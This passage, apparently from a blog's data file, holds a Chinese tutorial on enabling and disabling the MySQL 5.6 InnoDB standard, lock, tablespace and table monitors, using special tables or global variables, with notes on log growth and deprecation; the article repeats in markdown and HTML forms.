innodb_status_output_locks=OFF;\n```\n\n**注**：前提需要开启 `innodb_status_output`\n\n\n## 3. 开启表空间监控(InnoDB Tablespace Monitor)\n\n#### 基于系统表：innodb_tablespace_monitor\nmysql会通过检查是否存在名为`innodb_tablespace_monitor`的数据表，来判断是否开启表空间监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_tablespace_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_tablespace_monitor;\n```\n\n**注**：表空间监控暂不支持通过参数方式配置，并且未来会被废弃。\n\n\n## 4. 开启表监控(InnoDB Table Monitor)\nmysql会通过检查是否存在名为`innodb_table_monitor`的数据表，来判断是否开启表监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_table_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_table_monitor;\n```\n\n**注**：表监控暂不支持通过参数方式配置，并且未来会被废弃。\n\n\n## 四、注意事宜\n\n### 1. 监控复位\n需要特别注意的一点是：mysql服务重启后，需要重启开启相应监控，才会生效。换句话说，服务重启后，之前配置的所有监控都被复位，处于关闭状态。\n\n基于系统表方式开启的监控，在mysql服务重启后，即使表存在，监控也不会生效。需要重启drop表，再create表，才能使监控生效。\n\n基于系统参数方式开启的监控，在mysql服务重启后，相关系统参数值都是OFF。需要重启设置对应的参数，才能使用监控生效。\n\n\n### 2. 错误日志大小\n不在停机或重启情况下，mysql每15秒输出一次INNODB运行状态信息到错误日志。\n这会使用日志变得越来越大。建议在需要的时候开启，不需要的时候关闭掉。\n\n\n### 3. 基于表方式将来会被废弃\n基于表方式将来会被废弃，使用基于系统参数的方式开启。\n> Use INFORMATION_SCHEMA or PERFORMANCE_SCHEMA tables or SET GLOBAL innodb_status_output=ON.\n\n\n### 4. 基于表方式无关表结构及内容\n基于表方式，mysql只检验表名被创建，则开启监控。\n至于，表创建到哪个数据库、表具体的数据结构、表里的内容都不关心，不会对监控开启有任何影响。\n\n### 5. 日志状态输出时间\n虽说状态日志是每15秒周期性输出一次，但是由于状态收集与输出也会占用一些时间，特别是表空间日志(INNODB TABLE MONITOR OUTPUT)和表日志(INNODB TABLESPACE MONITOR OUTPUT)。因此，两次日志时间并不是规律的间隔15秒，而是自上次输出后15秒加上收集输出监控日志的时间。\n\n\n\n## 五、补充知识\n\n### 1. 查看错误日志输出位置\n``` bash\nmysql root@localhost:test> select @@log_error;\n+----------------------------------------+\n| @@log_error                            |\n|----------------------------------------|\n| /usr/local/mysql/data/mysqld.local.err |\n+----------------------------------------+\n```\n\n### 2. 查看历史日志开启状态与输出位置\n``` bash\nmysql root@localhost:test> show VARIABLES like 'general%';\n+------------------+---------------------------------------+\n| Variable_name    | Value                                 |\n|------------------+---------------------------------------|\n| general_log      | ON                                    |\n| general_log_file | /usr/local/mysql/data/yerba-buena.log |\n+------------------+---------------------------------------+\n```\n\n### 3. 监控日志解读\n详见参考文档2及参考文档5\n\n\n## 六、参考文档\n1. [Enabling InnoDB Monitors](https://dev.mysql.com/doc/refman/5.6/en/innodb-enabling-monitors.html)\n2. [InnoDB Standard Monitor and Lock Monitor Output](https://dev.mysql.com/doc/refman/5.6/en/innodb-standard-monitor.html)\n3. [How to debug InnoDB lock waits](http://www.xaprb.com/blog/2007/09/18/how-to-debug-innodb-lock-waits/)\n4. [How to find out who is locking a table in MySQL](http://www.xaprb.com/blog/2006/07/31/how-to-analyze-innodb-mysql-locks/)\n5. [InnoDB Monitor](http://blog.csdn.net/zyz511919766/article/details/50147283)\n6. [INNODB监控开关](http://blog.sina.com.cn/s/blog_5037eacb0102vj1w.html)","slug":"article/database/开启InnoDB监控","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrg002b5nbtqcgz4mkn","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<p>当前mysql版本：5.6.27</p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>在mysql处理死锁问题时，由于<code>show engine innodb status</code>输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。</p>\n<p>于是，需要能查看到更详细的事务锁占用情况。</p>\n<h2 id=\"二、INNODB监控机制-InnoDB-Monitors\"><a href=\"#二、INNODB监控机制-InnoDB-Monitors\" class=\"headerlink\" title=\"二、INNODB监控机制(InnoDB Monitors)\"></a>二、INNODB监控机制(InnoDB Monitors)</h2><p>mysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：<code>show engine innodb status</code>输出到控制台。<br>此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。</p>\n<p>官方说明(详见参考文档1)如下：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">When you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.</div></pre></td></tr></table></figure>\n</blockquote>\n<p>该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。<br>建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。</p>\n<h2 id=\"三、开启状态监控\"><a href=\"#三、开启状态监控\" class=\"headerlink\" title=\"三、开启状态监控\"></a>三、开启状态监控</h2><p>INNODB监控机制目前主要提供如下四类监控：</p>\n<ul>\n<li>标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。</li>\n<li>锁监控(InnoDB Lock Monitor)：提供额外的锁信息。</li>\n<li>表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。</li>\n<li>表监控(InnoDB Table Monitor)：显示内部数据字典的内容。</li>\n</ul>\n<p>关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。<br>基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。</p>\n<h3 id=\"1-标准监控-Standard-InnoDB-Monitor\"><a href=\"#1-标准监控-Standard-InnoDB-Monitor\" class=\"headerlink\" title=\"1. 标准监控(Standard InnoDB Monitor)\"></a>1. 标准监控(Standard InnoDB Monitor)</h3><h4 id=\"基于系统表：innodb-monitor\"><a href=\"#基于系统表：innodb-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_monitor\"></a>基于系统表：innodb_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_monitor</code>的数据表，来判断是否开启标准监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_monitor;</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于系统参数：innodb-status-output\"><a href=\"#基于系统参数：innodb-status-output\" class=\"headerlink\" title=\"基于系统参数：innodb_status_output\"></a>基于系统参数：innodb_status_output</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output</code>)的方式开启或者关闭标准监控。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">ON</span>;</div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">OFF</span>;</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"2-开启锁监控-InnoDB-Lock-Monitor\"><a href=\"#2-开启锁监控-InnoDB-Lock-Monitor\" class=\"headerlink\" title=\"2. 开启锁监控(InnoDB Lock Monitor)\"></a>2. 开启锁监控(InnoDB Lock Monitor)</h3><h4 id=\"基于系统表：innodb-lock-monitor\"><a href=\"#基于系统表：innodb-lock-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_lock_monitor\"></a>基于系统表：innodb_lock_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_lock_monitor</code>的数据表，来判断是否开启锁监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_lock_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_lock_monitor;</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于系统参数：innodb-status-output-locks\"><a href=\"#基于系统参数：innodb-status-output-locks\" class=\"headerlink\" title=\"基于系统参数：innodb_status_output_locks\"></a>基于系统参数：innodb_status_output_locks</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output_locks</code>)的方式开启或者关闭标准监控。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">ON</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output_locks=<span class=\"keyword\">ON</span>;</div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output_locks=<span class=\"keyword\">OFF</span>;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：前提需要开启 <code>innodb_status_output</code></p>\n<h2 id=\"3-开启表空间监控-InnoDB-Tablespace-Monitor\"><a href=\"#3-开启表空间监控-InnoDB-Tablespace-Monitor\" class=\"headerlink\" title=\"3. 开启表空间监控(InnoDB Tablespace Monitor)\"></a>3. 开启表空间监控(InnoDB Tablespace Monitor)</h2><h4 id=\"基于系统表：innodb-tablespace-monitor\"><a href=\"#基于系统表：innodb-tablespace-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_tablespace_monitor\"></a>基于系统表：innodb_tablespace_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_tablespace_monitor</code>的数据表，来判断是否开启表空间监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_tablespace_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_tablespace_monitor;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：表空间监控暂不支持通过参数方式配置，并且未来会被废弃。</p>\n<h2 id=\"4-开启表监控-InnoDB-Table-Monitor\"><a href=\"#4-开启表监控-InnoDB-Table-Monitor\" class=\"headerlink\" title=\"4. 开启表监控(InnoDB Table Monitor)\"></a>4. 开启表监控(InnoDB Table Monitor)</h2><p>mysql会通过检查是否存在名为<code>innodb_table_monitor</code>的数据表，来判断是否开启表监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_table_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_table_monitor;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：表监控暂不支持通过参数方式配置，并且未来会被废弃。</p>\n<h2 id=\"四、注意事宜\"><a href=\"#四、注意事宜\" class=\"headerlink\" title=\"四、注意事宜\"></a>四、注意事宜</h2><h3 id=\"1-监控复位\"><a href=\"#1-监控复位\" class=\"headerlink\" title=\"1. 监控复位\"></a>1. 监控复位</h3><p>需要特别注意的一点是：mysql服务重启后，需要重启开启相应监控，才会生效。换句话说，服务重启后，之前配置的所有监控都被复位，处于关闭状态。</p>\n<p>基于系统表方式开启的监控，在mysql服务重启后，即使表存在，监控也不会生效。需要重启drop表，再create表，才能使监控生效。</p>\n<p>基于系统参数方式开启的监控，在mysql服务重启后，相关系统参数值都是OFF。需要重启设置对应的参数，才能使用监控生效。</p>\n<h3 id=\"2-错误日志大小\"><a href=\"#2-错误日志大小\" class=\"headerlink\" title=\"2. 错误日志大小\"></a>2. 错误日志大小</h3><p>不在停机或重启情况下，mysql每15秒输出一次INNODB运行状态信息到错误日志。<br>这会使用日志变得越来越大。建议在需要的时候开启，不需要的时候关闭掉。</p>\n<h3 id=\"3-基于表方式将来会被废弃\"><a href=\"#3-基于表方式将来会被废弃\" class=\"headerlink\" title=\"3. 基于表方式将来会被废弃\"></a>3. 基于表方式将来会被废弃</h3><p>基于表方式将来会被废弃，使用基于系统参数的方式开启。</p>\n<blockquote>\n<p>Use INFORMATION_SCHEMA or PERFORMANCE_SCHEMA tables or SET GLOBAL innodb_status_output=ON.</p>\n</blockquote>\n<h3 id=\"4-基于表方式无关表结构及内容\"><a href=\"#4-基于表方式无关表结构及内容\" class=\"headerlink\" title=\"4. 基于表方式无关表结构及内容\"></a>4. 基于表方式无关表结构及内容</h3><p>基于表方式，mysql只检验表名被创建，则开启监控。<br>至于，表创建到哪个数据库、表具体的数据结构、表里的内容都不关心，不会对监控开启有任何影响。</p>\n<h3 id=\"5-日志状态输出时间\"><a href=\"#5-日志状态输出时间\" class=\"headerlink\" title=\"5. 日志状态输出时间\"></a>5. 日志状态输出时间</h3><p>虽说状态日志是每15秒周期性输出一次，但是由于状态收集与输出也会占用一些时间，特别是表空间日志(INNODB TABLE MONITOR OUTPUT)和表日志(INNODB TABLESPACE MONITOR OUTPUT)。因此，两次日志时间并不是规律的间隔15秒，而是自上次输出后15秒加上收集输出监控日志的时间。</p>\n<h2 id=\"五、补充知识\"><a href=\"#五、补充知识\" class=\"headerlink\" title=\"五、补充知识\"></a>五、补充知识</h2><h3 id=\"1-查看错误日志输出位置\"><a href=\"#1-查看错误日志输出位置\" class=\"headerlink\" title=\"1. 查看错误日志输出位置\"></a>1. 查看错误日志输出位置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:<span class=\"built_in\">test</span>&gt; select @@<span class=\"built_in\">log</span>_error;</div><div class=\"line\">+----------------------------------------+</div><div class=\"line\">| @@<span class=\"built_in\">log</span>_error                            |</div><div class=\"line\">|----------------------------------------|</div><div class=\"line\">| /usr/<span class=\"built_in\">local</span>/mysql/data/mysqld.local.err |</div><div class=\"line\">+----------------------------------------+</div></pre></td></tr></table></figure>\n<h3 id=\"2-查看历史日志开启状态与输出位置\"><a href=\"#2-查看历史日志开启状态与输出位置\" class=\"headerlink\" title=\"2. 查看历史日志开启状态与输出位置\"></a>2. 查看历史日志开启状态与输出位置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:<span class=\"built_in\">test</span>&gt; show VARIABLES like <span class=\"string\">'general%'</span>;</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\">| Variable_name    | Value                                 |</div><div class=\"line\">|------------------+---------------------------------------|</div><div class=\"line\">| general_<span class=\"built_in\">log</span>      | ON                                    |</div><div class=\"line\">| general_<span class=\"built_in\">log</span>_file | /usr/<span class=\"built_in\">local</span>/mysql/data/yerba-buena.log |</div><div class=\"line\">+------------------+---------------------------------------+</div></pre></td></tr></table></figure>\n<h3 id=\"3-监控日志解读\"><a href=\"#3-监控日志解读\" class=\"headerlink\" title=\"3. 监控日志解读\"></a>3. 监控日志解读</h3><p>详见参考文档2及参考文档5</p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ol>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-enabling-monitors.html\" target=\"_blank\" rel=\"external\">Enabling InnoDB Monitors</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-standard-monitor.html\" target=\"_blank\" rel=\"external\">InnoDB Standard Monitor and Lock Monitor Output</a></li>\n<li><a href=\"http://www.xaprb.com/blog/2007/09/18/how-to-debug-innodb-lock-waits/\" target=\"_blank\" rel=\"external\">How to debug InnoDB lock waits</a></li>\n<li><a href=\"http://www.xaprb.com/blog/2006/07/31/how-to-analyze-innodb-mysql-locks/\" target=\"_blank\" rel=\"external\">How to find out who is locking a table in MySQL</a></li>\n<li><a href=\"http://blog.csdn.net/zyz511919766/article/details/50147283\" target=\"_blank\" rel=\"external\">InnoDB Monitor</a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_5037eacb0102vj1w.html\" target=\"_blank\" rel=\"external\">INNODB监控开关</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<p>当前mysql版本：5.6.27</p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>在mysql处理死锁问题时，由于<code>show engine innodb status</code>输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。</p>\n<p>于是，需要能查看到更详细的事务锁占用情况。</p>\n<h2 id=\"二、INNODB监控机制-InnoDB-Monitors\"><a href=\"#二、INNODB监控机制-InnoDB-Monitors\" class=\"headerlink\" title=\"二、INNODB监控机制(InnoDB Monitors)\"></a>二、INNODB监控机制(InnoDB Monitors)</h2><p>mysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：<code>show engine innodb status</code>输出到控制台。<br>此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。</p>\n<p>官方说明(详见参考文档1)如下：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">When you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.</div></pre></td></tr></table></figure>\n</blockquote>\n<p>该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。<br>建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。</p>\n<h2 id=\"三、开启状态监控\"><a href=\"#三、开启状态监控\" class=\"headerlink\" title=\"三、开启状态监控\"></a>三、开启状态监控</h2><p>INNODB监控机制目前主要提供如下四类监控：</p>\n<ul>\n<li>标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。</li>\n<li>锁监控(InnoDB Lock Monitor)：提供额外的锁信息。</li>\n<li>表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。</li>\n<li>表监控(InnoDB Table Monitor)：显示内部数据字典的内容。</li>\n</ul>\n<p>关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。<br>基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。</p>\n<h3 id=\"1-标准监控-Standard-InnoDB-Monitor\"><a href=\"#1-标准监控-Standard-InnoDB-Monitor\" class=\"headerlink\" title=\"1. 标准监控(Standard InnoDB Monitor)\"></a>1. 标准监控(Standard InnoDB Monitor)</h3><h4 id=\"基于系统表：innodb-monitor\"><a href=\"#基于系统表：innodb-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_monitor\"></a>基于系统表：innodb_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_monitor</code>的数据表，来判断是否开启标准监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_monitor;</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于系统参数：innodb-status-output\"><a href=\"#基于系统参数：innodb-status-output\" class=\"headerlink\" title=\"基于系统参数：innodb_status_output\"></a>基于系统参数：innodb_status_output</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output</code>)的方式开启或者关闭标准监控。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">ON</span>;</div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">OFF</span>;</div></pre></td></tr></table></figure></p>","more":"<h3 id=\"2-开启锁监控-InnoDB-Lock-Monitor\"><a href=\"#2-开启锁监控-InnoDB-Lock-Monitor\" class=\"headerlink\" title=\"2. 开启锁监控(InnoDB Lock Monitor)\"></a>2. 开启锁监控(InnoDB Lock Monitor)</h3><h4 id=\"基于系统表：innodb-lock-monitor\"><a href=\"#基于系统表：innodb-lock-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_lock_monitor\"></a>基于系统表：innodb_lock_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_lock_monitor</code>的数据表，来判断是否开启锁监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_lock_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_lock_monitor;</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于系统参数：innodb-status-output-locks\"><a href=\"#基于系统参数：innodb-status-output-locks\" class=\"headerlink\" title=\"基于系统参数：innodb_status_output_locks\"></a>基于系统参数：innodb_status_output_locks</h4><p>自mysql 5.6.16版本之后，可以通过设置系统参数(<code>innodb_status_output_locks</code>)的方式开启或者关闭标准监控。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output=<span class=\"keyword\">ON</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output_locks=<span class=\"keyword\">ON</span>;</div><div class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">GLOBAL</span> innodb_status_output_locks=<span class=\"keyword\">OFF</span>;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：前提需要开启 <code>innodb_status_output</code></p>\n<h2 id=\"3-开启表空间监控-InnoDB-Tablespace-Monitor\"><a href=\"#3-开启表空间监控-InnoDB-Tablespace-Monitor\" class=\"headerlink\" title=\"3. 开启表空间监控(InnoDB Tablespace Monitor)\"></a>3. 开启表空间监控(InnoDB Tablespace Monitor)</h2><h4 id=\"基于系统表：innodb-tablespace-monitor\"><a href=\"#基于系统表：innodb-tablespace-monitor\" class=\"headerlink\" title=\"基于系统表：innodb_tablespace_monitor\"></a>基于系统表：innodb_tablespace_monitor</h4><p>mysql会通过检查是否存在名为<code>innodb_tablespace_monitor</code>的数据表，来判断是否开启表空间监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_tablespace_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_tablespace_monitor;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：表空间监控暂不支持通过参数方式配置，并且未来会被废弃。</p>\n<h2 id=\"4-开启表监控-InnoDB-Table-Monitor\"><a href=\"#4-开启表监控-InnoDB-Table-Monitor\" class=\"headerlink\" title=\"4. 开启表监控(InnoDB Table Monitor)\"></a>4. 开启表监控(InnoDB Table Monitor)</h2><p>mysql会通过检查是否存在名为<code>innodb_table_monitor</code>的数据表，来判断是否开启表监控，并打印日志。<br>需要开启，则创建表；需要关闭，则删除表。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> innodb_table_monitor (a <span class=\"built_in\">INT</span>) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">INNODB</span>;</div><div class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> innodb_table_monitor;</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：表监控暂不支持通过参数方式配置，并且未来会被废弃。</p>\n<h2 id=\"四、注意事宜\"><a href=\"#四、注意事宜\" class=\"headerlink\" title=\"四、注意事宜\"></a>四、注意事宜</h2><h3 id=\"1-监控复位\"><a href=\"#1-监控复位\" class=\"headerlink\" title=\"1. 监控复位\"></a>1. 监控复位</h3><p>需要特别注意的一点是：mysql服务重启后，需要重启开启相应监控，才会生效。换句话说，服务重启后，之前配置的所有监控都被复位，处于关闭状态。</p>\n<p>基于系统表方式开启的监控，在mysql服务重启后，即使表存在，监控也不会生效。需要重启drop表，再create表，才能使监控生效。</p>\n<p>基于系统参数方式开启的监控，在mysql服务重启后，相关系统参数值都是OFF。需要重启设置对应的参数，才能使用监控生效。</p>\n<h3 id=\"2-错误日志大小\"><a href=\"#2-错误日志大小\" class=\"headerlink\" title=\"2. 错误日志大小\"></a>2. 错误日志大小</h3><p>不在停机或重启情况下，mysql每15秒输出一次INNODB运行状态信息到错误日志。<br>这会使用日志变得越来越大。建议在需要的时候开启，不需要的时候关闭掉。</p>\n<h3 id=\"3-基于表方式将来会被废弃\"><a href=\"#3-基于表方式将来会被废弃\" class=\"headerlink\" title=\"3. 基于表方式将来会被废弃\"></a>3. 基于表方式将来会被废弃</h3><p>基于表方式将来会被废弃，使用基于系统参数的方式开启。</p>\n<blockquote>\n<p>Use INFORMATION_SCHEMA or PERFORMANCE_SCHEMA tables or SET GLOBAL innodb_status_output=ON.</p>\n</blockquote>\n<h3 id=\"4-基于表方式无关表结构及内容\"><a href=\"#4-基于表方式无关表结构及内容\" class=\"headerlink\" title=\"4. 基于表方式无关表结构及内容\"></a>4. 